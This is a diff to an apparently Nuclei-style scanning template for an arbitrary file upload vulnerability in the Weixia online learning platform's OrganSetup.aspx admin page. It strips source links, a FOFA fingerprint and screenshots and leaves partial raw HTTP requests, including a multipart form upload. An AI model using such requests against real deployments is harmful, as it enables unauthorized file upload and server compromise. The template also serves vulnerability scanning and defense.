@@ -3,14 +3,8 @@ info:
   name: 微厦在线学习平台OrganSetup存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kegdbx2pwutr12zy
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kegdbx2pwutr12zy
-    fofa: body="/Utility/CoreScripts/Widget.js"
 http:
 - raw:
   - 'GET /Manage/Admin/OrganSetup.aspx HTTP/1.1
@@ -27,10 +21,7 @@ http:
 
     Connection: close
 
-    Upgrade-Insecure-Requests: 1
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1716207855351-97a76d12-5880-46a0-bd65-908fd3ce54fe.png)'
+    Upgrade-Insecure-Requests: 1'
   redirects: false
   matchers:
   - status:
@@ -86,11 +77,9 @@ http:
     Content-Disposition: form-data; name="ctl00$cphMain$Org_PlatformName"
 
 
-
     -----------------------------286092866711427024533444908228
 
     Content-Disposition: form-data; name="ctl00$cphMain$Org_ICP"
-
 
 
     -----------------------------286092866711427024533444908228
@@ -114,11 +103,9 @@ http:
     Content-Type: application/octet-stream
 
 
-
     -----------------------------286092866711427024533444908228
 
     Content-Disposition: form-data; name="ctl00$cphMain$Org_QrCodeUrl"
-
 
 
     -----------------------------286092866711427024533444908228
@@ -163,11 +150,9 @@ http:
     Content-Disposition: form-data; name="ctl00$cphMain$Org_Keywords"
 
 
-
     -----------------------------286092866711427024533444908228
 
     Content-Disposition: form-data; name="ctl00$cphMain$Org_Description"
-
 
 
     -----------------------------286092866711427024533444908228
@@ -175,10 +160,7 @@ http:
     Content-Disposition: form-data; name="ctl00$cphMain$Org_Extracode"
 
 
-
-    -----------------------------286092866711427024533444908228--
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1716207855671-007caa34-b0e5-4e09-8403-d121810a3338.png)'
+    -----------------------------286092866711427024533444908228--'
   redirects: false
   matchers:
   - status:
